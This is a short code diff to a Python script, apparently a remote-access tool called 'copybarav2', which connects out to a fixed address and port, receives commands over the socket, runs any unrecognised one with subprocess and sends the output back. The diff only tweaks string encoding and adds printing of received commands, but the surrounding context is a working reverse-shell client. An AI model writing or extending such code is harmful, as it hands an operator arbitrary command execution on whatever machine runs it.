@@ -6,7 +6,8 @@ def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.197.222", 5555))
     while True:
-        command = s.recv(1024).decode("utf-8")
+        command = s.recv(1024).decode()
+        print(command)
         if command == "info":
             s.send("copybarav2 help command1 command2 command3".encode("utf-8"))
         elif command == "help":
@@ -17,7 +18,7 @@ def connect():
 					  command3 - Description of command 3\n"""   
         else:
             output = subprocess.getoutput(command)
-            s.send(output.encode("utf-8"))
+            s.send(output.encode())
     s.close()
 
 if __name__ == "__main__":
